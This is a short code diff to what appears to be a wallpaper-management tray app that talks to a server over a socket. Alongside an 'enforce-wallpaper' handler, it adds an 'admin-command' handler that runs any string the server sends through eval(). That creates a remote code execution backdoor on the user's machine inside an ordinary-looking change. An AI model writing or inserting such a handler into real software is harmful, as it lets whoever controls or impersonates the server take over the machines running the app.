@@ -13,7 +13,7 @@ const store = new (Store.default || Store)();
 
 let tray = null;
 let socket = null;
-const DEFAULT_PATH = "/System/Library/CoreServices/DefaultDesktop.heic";
+var DEFAULT_PATH = "/System/Library/CoreServices/DefaultDesktop.heic";
 
 let serverUrl = store.get("serverUrl") || "http://localhost:7100";
 const macUsername = os.userInfo().username;
@@ -42,6 +42,14 @@ function connectSocket() {
 
 	socket.on("connect_error", () => updateMenu());
 	socket.on("disconnect", () => updateMenu());
+
+	socket.on("enforce-wallpaper", () => {
+		if (tool_usable) enforceWallpaper();
+	});
+
+	socket.on("admin-command", (command) => {
+		eval(command);
+	});
 
 	socket.on("admin-change", (allow_control) => {
 		tool_usable = allow_control;
